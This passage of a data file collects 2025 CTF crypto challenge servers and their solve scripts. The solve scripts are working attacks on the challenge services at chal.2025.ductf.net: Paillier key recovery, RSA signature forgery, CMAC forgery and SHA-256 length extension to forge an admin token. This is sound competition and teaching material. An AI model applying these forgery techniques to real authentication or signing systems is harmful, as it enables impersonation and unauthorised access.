fixed_width >= len(self.stored_bits):\n            return self.stored_bits.rjust(fixed_width, str(self.signed))\n\n    def __xor__(self, other):\n        if isinstance(other, python_int):\n            nbit = max(self.bit_length, other.bit_length)\n            bits1 = self.bits(nbit)\n            bits2 = other.bits(nbit)\n            result_bits = ''.join('1' if b1 != b2 else '0' for b1, b2 in zip(bits1, bits2))\n            signed = self.signed ^ other.signed\n            return python_int(self.integer_value(result_bits, signed))\n        return NotImplementedError(\"Unsupported operand type(s) for ^: 'python_int' and '{}'\".format(type(other)))\n\n    def __repr__(self):\n        return f\"{self.value}\"\n\n    def __int__(self):\n        return self.value\n    \n    def __eq__(self, other):\n        if isinstance(other, python_int):\n            return self.value == other.value\n        elif isinstance(other, int):\n            return self.value == other\n        else:\n            return NotImplementedError(\"Unsupported operand type(s) for ==: 'python_int' and '{}'\".format(type(other)))\n   \nprint(python_int(-3).bits(8))\nprint(python_int(-4).bits(8)) \n\nfor v1 in [3, -3]:\n    for v2 in [4, -4]:\n        p1 = python_int(v1)\n        p2 = python_int(v2)\n        check = p1 ^ p2 == v1 ^ v2\n        print(f\"{check =}\")\n        \nv1 = random.randint(1, 2**64)\nv2 = -random.randint(1, 2**64)\np1 = python_int(v1)\np2 = python_int(v2)\nprint(f\"{p1.bits(64) = }, with value {v1}\")\nprint(f\"{p2.bits(64) = }, with value {v2}\")\ncheck = p1 ^ p2 == v1 ^ v2\nprint(f\"{check =}\")", "name": "python_int_xor"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\jqctf\\r4nd0m\\server.py", "category": "crypto", "solution_code": "import os, random\nflag = os.getenv(\"FLAG\", \"flag{redacted}\")\n\ndef encrypt(key, message):\n    otp = random.Random(key).randbytes(len(message))\n    return bytes([i ^ j for i, j in zip(otp, message)])\n\nwhile True:\n    key = int.from_bytes(flag.encode(), 'big')\n    msg = bytes.fromhex(input('ðŸ’¬'))[:64]\n    err = int(input('ðŸ”§'))\n    print('ðŸ”’', encrypt(key ^ err, msg).hex())\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\good-game-spawn-point\\chal.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\nimport os\nimport secrets\nimport hashlib\nfrom Crypto.Util.number import getPrime\nfrom Crypto.PublicKey import ECC\n\nFLAG = os.getenv(\"FLAG\", \"DUCTF{testflag}\")\n\n# https://neuromancer.sk/std/nist/P-256\norder = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551 * 0x1\n\n\ndef ec_key():\n    eck = ECC.generate(curve=\"p256\")\n    secret = int(eck.d)\n    public_key = {\n        \"x\": int(eck.public_key().pointQ.x),\n        \"y\": int(eck.public_key().pointQ.y),\n    }\n    return secret, public_key\n\n\ndef paillier_key():\n    p = getPrime(1024)\n    q = getPrime(1024)\n    n = p * q\n    return p, q, n\n\n\ndef mta_response(ciphertext, n, secret):\n    beta = secrets.randbelow(n)\n    nsq = n * n\n\n    # E(plaintext * secret)\n    mta_response = pow(ciphertext, secret, nsq)\n\n    # E(beta)\n    r = secrets.randbelow(n)\n    beta_enc = (pow(r, n, nsq) * pow(n + 1, beta, nsq)) % nsq\n\n    # E(plaintext * secret + beta)\n    mta_response = (mta_response * beta_enc) % nsq\n\n    return mta_response, beta\n\n\ndef zk_schnorr(beta):\n    r = secrets.randbelow(order)\n    r_pub = ECC.construct(curve=\"p256\", d=r % order).public_key().pointQ\n    beta_pub = ECC.construct(curve=\"p256\", d=beta % order).public_key().pointQ\n\n    challenge_input = f\"{beta}{order}{beta_pub}{r_pub}\".encode()\n    c_hash = int.from_bytes(hashlib.sha256(challenge_input).digest(), \"big\")\n    z = (r + beta * c_hash) % order\n\n    return {\n        \"hash\": c_hash,\n        \"r_pub\": {\n            \"x\": int(r_pub.x),\n            \"y\": int(r_pub.y),\n        },\n        \"beta_pub\": {\n            \"x\": int(beta_pub.x),\n            \"y\": int(beta_pub.y),\n        },\n    }\n\n\ndef main():\n    print(\n        \"\"\"\n        it's 4pm on a school afternoon. you just got home, tossed your bag\n        on the floor, and turned on ABC3. it's time.. for GGSP\n        \"\"\"\n    )\n\n    secret, public_key = ec_key()\n    print(\"public key:\", public_key)\n\n    p, q, n = paillier_key()\n    print(\"paillier key:\", {\"p\": p, \"q\": q})\n\n    for _ in range(5):\n        c = int(input(\"ciphertext:\"))\n        response, beta = mta_response(c, n, secret)\n        print(\"mta response:\", response)\n\n        proof = zk_schnorr(beta)\n        print(\"zk schnorr:\", proof)\n\n    guess = int(input(\"guess secret:\"))\n    if guess == secret:\n        print(\"nice :o\", FLAG)\n    else:\n        print(\"bad luck\")\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "chal"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\good-game-spawn-point\\solve.py", "category": "crypto", "solution_code": "from pwn import remote, process, context, log\nfrom Crypto.Util.number import getPrime\nimport os\nfrom sage.all import GF, ZZ, EllipticCurve, discrete_log\nimport json\nimport secrets\n\ndef paillier_decrypt(ciphertext, n, lambda_n, mu):\n    nsq = n * n\n    # Decrypt using the Paillier decryption formula\n    u = pow(ciphertext, lambda_n, nsq)\n    plaintext = ((u - 1) // n) * mu % n\n    return plaintext\n\ndef paillier_encrypt(plaintext, n):\n    nsq = n * n\n    r = secrets.randbelow(n)\n    g = n + 1\n    # Encrypt using the Paillier encryption formula\n    ciphertext = (pow(g, plaintext, nsq) * pow(r, n, nsq)) % nsq\n    return ciphertext\n\np = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\nK = GF(p)\na = K(0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc)\nb = K(0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b)\nE = EllipticCurve(K, (a, b))\nG = E(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)\nE.set_order(0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 * 0x1)\norder = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551 * 0x1\n\n# AU: nc chal.2025.ductf.net 30011\n# US: nc chal.2025-us.ductf.net 30011\nlocal = True\nio = remote(\"chal.2025.ductf.net\", 30011) if not local else process([\"python\", \"chal.py\"])\n\nio.recvuntil(b\"public key:\")\npublic_key = json.loads(io.recvline().decode().strip().replace(\"'\", '\"'))\nQx = public_key[\"x\"]\nQy = public_key[\"y\"]\nQ = E(Qx, Qy)\nio.recvuntil(b\"paillier key:\")\npaillier_key = json.loads(io.recvline().decode().strip().replace(\"'\", '\"'))\nn = paillier_key[\"p\"] * paillier_key[\"q\"]\nn_bitlength = n.bit_length()\nlambda_n = (paillier_key[\"p\"] - 1) * (paillier_key[\"q\"] - 1)\nmu = pow(lambda_n, -1, n)\n\ndlog_bit = 43\n# 52 * 5 = 256\nBs = []\nalphas = []\nfor i in range(1, 6):\n    ct = paillier_encrypt(2**(n_bitlength - 256 + i * dlog_bit), n)\n    io.sendlineafter(b\"ciphertext:\", str(ct).encode())\n    io.recvuntil(b\"mta response:\")\n    mta_response = int(io.recvline().decode().strip())\n    io.recvuntil(b\"zk schnorr:\")\n    zk_schnorr = json.loads(io.recvline().decode().strip().replace(\"'\", '\"'))\n    Bx = zk_schnorr[\"beta_pub\"][\"x\"]\n    By = zk_schnorr[\"beta_pub\"][\"y\"]\n    B = E(Bx, By)\n    # alpha = 2**m * s + beta % n\n    alpha = paillier_decrypt(mta_response, n, lambda_n, mu)\n    Bs.append(B)\n    alphas.append(alpha)\n\n# try dlog\nnG = (n % order) * G\nsecret = 0\nprint(\"Trying to find secret...\")\nsecret_ub = 2**256\nsecret_lb = 0\nks = []\nfor i in range(1, 6):\n    B = Bs[i - 1]\n    alpha = alphas[i - 1]\n    m = (n_bitlength - 256 + i * dlog_bit)\n    # alpha = 2**m * s + beta % n\n    # alpha = 2**m * s + beta - kn\n    A = alpha * G\n    # A = (2**m) Q + B - k nG\n    Y = (2**m) * Q + B - A\n    # try discrete logarithm\n    if i == 1:\n        print(f\"i: {i}, dlog interval: {dlog_bit + 1} bits\")\n        k = discrete_log(Y, nG, bounds=[0, 2**(dlog_bit + 1)], operation=\"+\")\n    else:\n        # alpha_i = 2**(m + delta) * s + beta_i - k_i * n < 2**delta (alpha_{i-1} + k_{i-1} n) + beta_i - k_i n\n        # k_i < (2**delta * (alpha_{i-1} + k_{i-1} n) + beta_i - alpha_i) / n\n        # k_i > (2**delta * (alpha_{i-1} + (k_{i-1} - 1) n) + beta_i - alpha_i) / n\n        k_i_ub = (2**dlog_bit * (alphas[i - 2] + ks[-1] * n) + n - alphas[i - 1]) // n\n        k_i_lb = (2**dlog_bit * (alphas[i - 2] + (ks[-1] - 1) * n) + 0 - alpha + n) // n\n        dlog_interval = int(k_i_ub - k_i_lb)\n        print(f\"i: {i}, dlog interval: {dlog_interval.bit_length()} bits\")\n        k = discrete_log(Y, nG, bounds=[k_i_lb, k_i_ub], operation=\"+\")\n    print(f\"i: {i}, k: {k}\")\n    ks.append(k)\n    # alpha = 2**m * s + beta - kn\n    # 0 < alpha + kn -  2**m * s < n\n    # alpha + (k-1)n < 2**m * s  < alpha + kn\n\nk = ks[-1]\nalpha = alphas[-1]\nm = (n_bitlength - 256 + 5 * dlog_bit)\nsecret_lb = (alpha + (k-1) * n) // 2**m\nsecret_ub =  (alpha + k* n) // 2**m\ndlog_interval = int(secret_ub - secret_lb).bit_length()\nprint(f\"Final remaining {dlog_interval} bits\")\nsecret = discrete_log(Q, G, bounds=[secret_lb, secret_ub], operation=\"+\")\nprint(f\"Secret found: {secret}\")\nio.sendlineafter(b\"secret:\", str(secret).encode())\nio.interactive()", "name": "solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\sh-rsa\\exp_clean.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\nfrom pwn import remote, process\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom hashlib import shake_128\nfrom sage.all import matrix, ZZ,  RealField, log\nfrom math import prod\nfrom tqdm import trange\nimport random\n\n\ndef H(N, m):\n    return shake_128(long_to_bytes(N) + m).digest(8)\n\n# Connection setup: switch to remote on challenge\nlocal = True\n# local = False\n\nio = process([\"python\", \"sh-rsa.py\"]) if local else remote(\n    \"chal.2025.ductf.net\", 30012\n)\n\n# Receive parameters\nN = int(io.recvline().decode().split(' = ')[1].strip())\ne = int(io.recvline().decode().split(' = ')[1].strip())\n\n# Precompute target exponent bounds\nbit_precision = 128\nRR = RealField(bit_precision)\ntgt = int.from_bytes(H(N, b'challenge'))\n# to find \\prod hi^ki = tgt << shift, we want tgt << shift to be as large as possible but not greater than n.\n# therefore, we choose shift = 4096 - 64 - 8.\nshift = 4096 - 64 - 8\n# the exponent bounds are then:\nexp_lb = int(RR(log(tgt << shift, 2)) * 2**bit_precision)\nexp_ub = int(RR(log((tgt + 1) << shift, 2)) * 2**bit_precision)\nexp_mid = (exp_ub + exp_lb) // 2 \n\ndiff = exp_ub - exp_lb\n# the max error we can tolerate is: diff//2\ndiff_bit = diff.bit_length()\nprint(f\"Max error: {diff.bit_length()} bits\")\n\n# Collect logs and ciphertexts\nms, cs, expons = [], [], []\n\nfor i in trange(92):\n    pt = long_to_bytes(i)\n    mi = bytes_to_long(H(N, pt))\n    ms.append(mi)\n    ci = eval(io.recvline().decode().strip().split(\" \")[1].strip())\n    cs.append(ci)\n    expons.append(int(RR(log(mi, 2)) * 2**bit_precision))\n    # expons.append(int(RR(log(mi), 2) * 2**bit_precision))\n\n# number of samples for constructing lattice\nn = 48\ncnt = 0\nwhile True:\n    cnt += 1\n    print(f\"Attempted times: {cnt}...\")\n    sampled_idxs = random.sample(range(len(expons)), n)\n    sampled_expons = [expons[i] for i in sampled_idxs]\n    sampled_ms = [ms[i] for i in sampled_idxs]  \n    sampled_cs = [cs[i] for i in sampled_idxs]\n    sampled_expons.append(- exp_mid)\n\n    mat = matrix(ZZ, n + 1, n + 2)\n    # the target error bit\n    error_bit = diff_bit - 2\n    error = 2**error_bit\n    coeff_rescale = 2**(error_bit)\n\n    for i in range(n + 1):\n        mat[i, 0] = sampled_expons[i]\n        mat[i, i + 1] = coeff_rescale\n\n    mat[-1, -1] = error\n    L = mat.LLL()\n    L = L.BKZ(block_size = 10)\n\n    for row in L:\n        if row[-1] == error:\n            coeffs = [int(num//coeff_rescale) for num in row[1:-1]]\n            res = exp_mid + row[0]\n            real_error_bit = row[0].bit_length()\n            print(f\"Found a possible valid row, check {exp_lb < res  < exp_ub = }\")\n            print(f\"Coefficients: {coeffs} {sum(coeffs) = } {real_error_bit = }\")\n            if all(c >= 0 for c in coeffs) and exp_lb < res  < exp_ub:\n                print(f\"Valid coefficients: {coeffs}\")\n                # valid coefficients found, compute the signature\n                result_bytes = long_to_bytes(prod([m**coeff for m, coeff in zip(sampled_ms, coeffs)]))\n                print(f\"Target Hex: {H(N, b'challenge').hex()}\")\n                print(f\"Result: {result_bytes.hex()[:16]}\")\n                sig = 1\n                for ci, coeff in zip(sampled_cs, coeffs):\n                    sig *= pow(ci, coeff, N)\n                    sig %= N\n                # sig = prod([pow(c, coeff, n) for c, coeff in zip(cs, coeffs)])\n                io.sendlineafter(b's: ', long_to_bytes(sig).hex().encode())\n                io.interactive()\n                exit(0)", "name": "exp_clean"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\sh-rsa\\sh-rsa.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom gmpy2 import mpz, next_prime\nfrom hashlib import shake_128\nimport secrets, signal, os\n\ndef H(N, m):\n    return shake_128(long_to_bytes(N) + m).digest(8)\n\ndef sign(N, d, m):\n    return pow(mpz(bytes_to_long(H(N, m))), d, N)\n\ndef verify(N, e, m, s):\n    return long_to_bytes(pow(s, e, N))[:8] == H(N, m)\n    # return long_to_bytes(pow(s, e, N))[-8:] == H(N, m)\n    \n\ndef main():\n    p = int(next_prime(secrets.randbits(2048)))\n    q = int(next_prime(secrets.randbits(2048)))\n    N = p * q\n    e = 0x10001\n    d = pow(e, -1, (p - 1) * (q - 1))\n\n    print(f'{N = }')\n    print(f'{e = }')\n\n    for i in range(256):\n        m = long_to_bytes(i)\n        s = sign(N, d, m)\n        print(m.hex(), hex(s))\n\n    signal.alarm(46)\n\n    s = int(input('s: '), 16)\n    if verify(N, e, b'challenge', s):\n        print(os.getenv('FLAG', 'DUCTF{test_flag}'))\n    else:\n        print('Nope')\n\nif __name__ == '__main__':\n    main()\n", "name": "sh-rsa"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\Speak-Friend-and-Enter\\server.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nfrom Crypto.Hash import CMAC, SHA512\nfrom Crypto.Cipher import AES\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom binascii import unhexlify\nimport random, json, string\n\nfrom cryptosecrets import NIST_SP_800_38B_Appendix_D1_K, flag\n\n## Generated once and MAC saved\n# r = RSA.generate(2048)\n# cc = CMAC.new(NIST_SP_800_38B_Appendix_D1_K, ciphermod=AES)\n# server_cmac_publickey = cc.update(long_to_bytes(r.n)).digest()\n\nserver_cmac_publickey = unhexlify('9d4dfd27cb483aa0cf623e43ff3d3432')\n\nchallenge_string = \"\".join([random.choice(string.ascii_letters + string.digits) for _ in range(48)]).encode()\n\nprint(f\"Here is your challenge string: {challenge_string.decode()}\")\nprint('Enter your signature for verification as a json string {\"public_key\": (int), \"signature\" : (int)}:') \njs = input()\n\ntry:\n    j = json.loads(js)\n    public_key = j['public_key']\n    signature = j['signature']\nexcept Exception as e:\n    print(f\"Error in input: {e}\")\n    exit(0)\n\n\n## Check public key hash matches server\ncc = CMAC.new(NIST_SP_800_38B_Appendix_D1_K, ciphermod=AES)\nmac = cc.update(long_to_bytes(public_key)).digest()\n\nif mac != server_cmac_publickey:\n    print(\"Public key MAC did not match\")\n    exit(0)\n\nif public_key.bit_length() != 2048:\n    print(\"Public key size incorrect\")\n    exit(0)\n\nr = RSA.construct((public_key, 65537))\ns = bytes_to_long(SHA512.new(challenge_string).digest())\n\nif pow(signature, 65537, r.n) == s:\n    print(f'Signature verified! Here is your flag: {flag}')\n    exit(0)\nelse:\n    print(\"Signature incorrect\")\n    exit(0)\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\Speak-Friend-and-Enter\\solve.py", "category": "crypto", "solution_code": "from Crypto.Cipher import AES\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes, isPrime\nfrom Crypto.Util.py3compat import bord\nfrom Crypto.Util.strxor import strxor\nfrom Crypto.Hash import CMAC, SHA512\nimport os\nfrom binascii import unhexlify\nfrom pwn import remote, process\nimport json\n\nBLOCK_SIZE = 16\nRB = 0x87\n\ndef _shift_bytes(bs, xor_lsb=0):\n    num = (bytes_to_long(bs) << 1) ^ xor_lsb\n    return long_to_bytes(num, len(bs))[-len(bs):]\n\ndef aes_cbc_mac(key: bytes, data: bytes) -> bytes:\n    cipher_ecb = AES.new(key, AES.MODE_ECB)\n    L = cipher_ecb.encrypt(b'\\x00' * BLOCK_SIZE)\n    cipher_cbc = AES.new(key, AES.MODE_CBC, iv = b\"\\x00\" * BLOCK_SIZE)\n    if len(data) % BLOCK_SIZE != 0:\n        data += b'\\x80' + b'\\x00' * (BLOCK_SIZE - len(data) % BLOCK_SIZE - 1)\n    if bord(L[0]) & 0x80:\n        K1 = _shift_bytes(L, RB)\n    else:\n        K1 = _shift_bytes(L)\n    if bord(K1[0]) & 0x80:\n        K2 = _shift_bytes(K1, RB)\n    else:\n        K2 = _shift_bytes(K1)\n    ct = cipher_cbc.encrypt(data)\n    assert len(ct) == len(data)\n    if len(data) >= 2*BLOCK_SIZE:\n        second_last = ct[-2*BLOCK_SIZE:-BLOCK_SIZE]\n    else:\n        second_last = b\"\\x00\" * BLOCK_SIZE\n    last_pt = strxor(second_last, data[-BLOCK_SIZE:])\n    return cipher_ecb.encrypt(strxor(last_pt, K1))\n\ndef forge_cbc_mac(key: bytes, target_mac: bytes, total_bytes: int):\n    assert total_bytes % BLOCK_SIZE == 0\n    n_blocks = total_bytes // BLOCK_SIZE\n    cipher_ecb = AES.new(key, AES.MODE_ECB)\n    L = cipher_ecb.encrypt(b'\\x00' * BLOCK_SIZE)\n    if bord(L[0]) & 0x80:\n        K1 = _shift_bytes(L, RB)\n    else:\n        K1 = _shift_bytes(L)\n    \n    c_last = os.urandom(BLOCK_SIZE)\n    pt_last = strxor(strxor(cipher_ecb.decrypt(target_mac), K1), c_last)\n    pt_blocks_reverse = [pt_last]\n    for i in range(n_blocks - 1):\n        if i == n_blocks - 2:\n            # the iv is zero block\n            new_c_last = b\"\\x00\" * BLOCK_SIZE\n        else:\n            new_c_last = os.urandom(BLOCK_SIZE)\n        pt_last = strxor(cipher_ecb.decrypt(c_last), new_c_last)\n        pt_blocks_reverse.append(pt_last)\n        c_last = new_c_last\n    pt_blocks_reverse.reverse()\n    return b''.join(pt_blocks_reverse)\n    \n\ndef test():\n    NIST_SP_800_38B_Appendix_D1_K = bytes.fromhex(\"2b7e1516 28aed2a6 abf71588 09cf4f3c\".replace(\" \", \"\"))\n    cc = CMAC.new(NIST_SP_800_38B_Appendix_D1_K, ciphermod=AES)\n    mac1 = cc.update(b\"\\x00\" * 32).digest()\n    mac2 = aes_cbc_mac(NIST_SP_800_38B_Appendix_D1_K, b\"\\x00\" * 32)\n    print(f\"{mac1.hex() = }\")\n    print(f\"{mac2.hex() = }\")\n    print(f\"{mac2.hex() == mac1.hex() }\")\n    fake = forge_cbc_mac(NIST_SP_800_38B_Appendix_D1_K, mac2, 64)\n    print(f\"{fake.hex() = }\")\n    new_mac = aes_cbc_mac(NIST_SP_800_38B_Appendix_D1_K, fake)\n    print(f\"{new_mac.hex() = }\")\n    print(f\"{new_mac.hex() == mac1.hex() }\")\n\n# NIST_SP_800_38B_Appendix_D1_K = bytes.fromhex(\"2b7e1516 28aed2a6 abf71588 09cf4f3c\".replace(\" \", \"\"))\n# server_cmac_publickey = unhexlify('9d4dfd27cb483aa0cf623e43ff3d3432')\n# cc = CMAC.new(NIST_SP_800_38B_Appendix_D1_K, ciphermod=AES)\n# while True:\n#     n_bytes = forge_cbc_mac(NIST_SP_800_38B_Appendix_D1_K, server_cmac_publickey, 2048 // 8)\n#     n = int.from_bytes(n_bytes, 'big')\n#     if n.bit_length() == 2048 and isPrime(n):\n#         print(f\"Found a valid public key: {n = }\")\n#         break\n\n# https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38b.pdf\nNIST_SP_800_38B_Appendix_D1_K = bytes.fromhex(\"2b7e1516 28aed2a6 abf71588 09cf4f3c\".replace(\" \", \"\"))\nserver_cmac_publickey = unhexlify('9d4dfd27cb483aa0cf623e43ff3d3432')\ncc = CMAC.new(NIST_SP_800_38B_Appendix_D1_K, ciphermod=AES)\nn = 28820206493588447008746090302284853639546136320404095125596636689682406385330694351586552922448711589443889356163596369278846074364251272231248429321834561757745426629442454937402033815450095576613352750744923297708600469312419911793921000880934167630401641828848304372984776245020443492178546750689178398279995393079144743297808780124266558952497251752972959691023618031531852504193197592266358140473437876604403520546254594953657774538929287289388355804827986934647490748008085045301844184757662277098954042039096481144682656347068460759940523129002797879162375689266082142897452515887446952422551354193755368485111\n\nassert cc.update(long_to_bytes(n)).digest() == server_cmac_publickey\n# AU: nc chal.2025.ductf.net 30008\n# US: nc chal.2025-us.ductf.net 30008\nio = remote('chal.2025.ductf.net', 30008)\n\nio.recvuntil(b\"challenge string: \")\nchallenge_string = io.recvline().strip()\nhm = bytes_to_long(SHA512.new(challenge_string).digest())\nd = pow(65537, -1, n - 1)\nsig = pow(hm, d, n)\nio.sendline(json.dumps({\"public_key\": n, \"signature\": sig}).encode())\nio.interactive()", "name": "solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\yet-another-login\\chall.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nfrom Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes\nfrom hashlib import sha256\nfrom secrets import randbits\nimport os\n\nFLAG = os.getenv('FLAG', 'DUCTF{FLAG_TODO}')\n\nclass TokenService: \n    def __init__(self):\n        self.p = getPrime(512)\n        self.q = getPrime(512)\n        self.n = self.p * self.q\n        self.n2 = self.n * self.n\n        self.l = (self.p - 1) * (self.q - 1)\n        self.g = self.n + 1\n        self.mu = pow(self.l, -1, self.n)\n        self.secret = os.urandom(16)\n\n    def _encrypt(self, m):\n        r = randbits(1024)\n        c = pow(self.g, m, self.n2) * pow(r, self.n, self.n2) % self.n2\n        return c\n\n    def _decrypt(self, c):\n        return ((pow(c, self.l, self.n2) - 1) // self.n) * self.mu % self.n\n\n    def generate(self, msg):\n        h = bytes_to_long(sha256(self.secret + msg).digest())\n        return long_to_bytes(self._encrypt(h))\n\n    def verify(self, msg, mac):\n        h = sha256(self.secret + msg).digest()\n        w = long_to_bytes(self._decrypt(bytes_to_long(mac)))\n        return h == w[-32:]\n\n\ndef menu():\n    print('1. Register')\n    print('2. Login')\n    return int(input('> '))\n\n\ndef main():\n    ts = TokenService()\n    print(ts.n)\n\n    while True:\n        choice = menu()\n        if choice == 1:\n            username = input('Username: ').encode()\n            if b'admin' in username:\n                print('Cannot register admin user')\n                exit(1)\n            msg = b'user=' + username\n            mac = ts.generate(msg)\n            print('Token:', (msg + b'|' + mac).hex())\n        elif choice == 2:\n            token = bytes.fromhex(input('Token: '))\n            msg, _, mac = token.partition(b'|')\n            if ts.verify(msg, mac):\n                user = msg.rpartition(b'user=')[2]\n                print(f'Welcome {user}!')\n                if user == b'admin':\n                    print(FLAG)\n            else:\n                print('Failed to verify token')\n        else:\n            exit(1)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DownUnder\\yet-another-login\\exp.py", "category": "crypto", "solution_code": "from tqdm import trange\nfrom pwn import remote, process\nfrom hashlib import sha256\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\nfrom secrets import randbits\nimport HashTools\n\ndef encrypt(msg: bytes, io: remote):\n    io.sendlineafter(b'> ', b'1')\n    io.sendlineafter(b'Username: ', msg)\n    res =  io.recvline().strip().decode().partition(':')[2]\n    msg, _, mac = bytes.fromhex(res).partition(b'|')\n    return msg, mac\n\ndef verify(msg: bytes, mac: bytes, io: remote):\n    io.sendlineafter(b'> ', b'2')\n    io.sendlineafter(b'Token: ', (msg + b'|' + mac).hex().encode())\n    return b'Failed' not in io.recvline().strip()\n\ndef bit_i(n, i):\n    return (n >> i) & 1\n\ndef local_encrypt(inp: int):\n    # r = randbits(1024)\n    r = 2\n    g = n + 1\n    n2 = n * n\n    c = pow(g, inp, n2) * pow(r, n, n2) % n2\n    return c\n\nlocal = True\n# local = False\n\n# nc chal.2025-us.ductf.net 30010\n# nc chal.2025.ductf.net 30010\nio = process([\"python3\", \"./chall.py\"]) if local else remote('chal.2025-us.ductf.net', 30010)\n\nn = int(io.recvline().strip().decode())\nn2 = n * n\nprint(f\"{n.bit_length()} bits\")\n# pad the message for sha256 to 64 bytes, one block\n# uname = b\"a\" * (64 - 16 - 5)\nuname = b\"a\"\nmsg, mac = encrypt(uname, io)\nprint(f\"Message: {msg}, MAC: {mac.hex()}\")\n# recover the hash of the message through the decrypt oracle\nn_bit = n.bit_length()\nassert bit_i(n, n_bit - 1) == 1\nknown_bits = \"\"\nmac_val = bytes_to_long(mac)\n\nc = local_encrypt(-2**(n_bit - 1))\n\nfor i in trange(256):\n    if i > 0:\n        unknown_mac = local_encrypt(-int(known_bits + '0' * (256 - len(known_bits)), 2)) * mac_val % n2\n    else:\n        unknown_mac = mac_val\n    unknown_mac_shifted = pow(unknown_mac, 2**(n_bit - 256 + i), n2)\n    # mac of : h' || 0...0 || h where h chunk is 32 bytes and h' is aligned to the msb of n.\n    combined = unknown_mac_shifted * mac_val % n2\n    ct = c * combined % n2\n    if verify(msg, long_to_bytes(ct), io):\n        # m - 2**n_bit valid\n        known_bits += '1'\n    else:\n        # m - 2**n_bit invalid\n        known_bits += '0'\n\n\n# import HashTools\n# from os import urandom\n\n# # setup context\n# secret = urandom(16)        # idk Â¯\\_(ãƒ„)_/Â¯\n# original_data = b\"&admin=False\"\n# sig = HashTools.new(algorithm=\"sha256\", raw=secret+original_data).hexdigest()\n# # attack\n# append_data = b\"&admin=True\"\n# magic = HashTools.new(\"sha256\")\n# new_data, new_sig = magic.extension(\n#     secret_length=16, original_data=original_data,\n#     append_data=append_data, signature=sig\n# )\n\nmagic = HashTools.new(\"sha256\")\nhashout = int(known_bits, 2).to_bytes(32, 'big')\nprint(f\"Known Hash: {hashout.hex()}\") \nextended = b'user=admin'\nnew_data, new_sig = magic.extension(\n    secret_length=16, original_data=msg,\n    append_data=extended, signature=hashout.hex()\n)\nprint(f\"New data: {new_data}, New sig: {new_sig}\")\nnew_sig = bytes.fromhex(new_sig)\nnew_mac = long_to_bytes(local_encrypt(bytes_to_long(new_sig)))\ncheck = verify(new_data, new_mac, io)\nif check:\n    print(\"Success! Admin access granted.\")\n    print(io.recvline().strip().decode())\nelse:\n    print(\"Failed to gain admin access.\")\nio.close()", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DiceCTF\\nic-cir\\gen.py", "category": "crypto", "solution_code": "import secrets\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\nif __name__ == '__main__':\n\twith open('flag.txt', 'rb') as f:\n\t\tflag = f.read().strip()\n\n\t# key = secrets.token_bytes(16)\n\tkey = bytes.fromhex(\"fabda3d3c69ccaec4ad19dc15ab8dff5\")\n\tcipher = AES.new(key, AES.MODE_ECB)\n\tflag_enc = cipher.encrypt(pad(flag, 16))\n\n\twith open('key.txt', 'w') as f:\n\t\tf.write(key.hex())\n\n\twith open('flag_enc_hex.txt', 'w') as f:\n\t\tf.write(flag_enc.hex())\n", "name": "gen"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\DiceCTF\\nic-cir\\local_solve.py", "category": "crypto", "solution_code": "from sage.all import BooleanPolynomialRing, GF, Sequence, Ideal\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\nwith open('aes.txt', 'r') as f:\n    cir_lines = f.readlines()[3:]\n\nwith open(\"wires_truth.txt\", \"r\") as f:\n    wires_truth = f.readlines()\n\nwith open(\"flag_enc_hex.txt\", \"r\") as f:\n    flag_enc = bytes.fromhex(f.read().strip())\n\nR = BooleanPolynomialRing(128, [f'x_{i}' for i in range(128)])\nF2 = GF(2)\nxlist = list(R.gens())\nall_wires = [F2(0)] * 128 + xlist\nall_wires += [None] * 40000\n\nfor line in wires_truth:\n    if line.startswith(\"Input Wire\"):\n        idx, bit = line[10:].strip().split(\":\")\n        all_wires[int(idx.strip())] = F2(int(bit.strip() == \"true\"))\n\neqs = []\n\nfor i, line in enumerate(cir_lines):\n    if line.strip() == \"\":\n        continue\n    ops = line.split()\n    if ops[-1] == \"XOR\":\n        assert len(ops) == 6\n        input1 = int(ops[2])\n        input2 = int(ops[3])\n        output = int(ops[4])\n        if all_wires[input1] is None:\n            continue\n        if 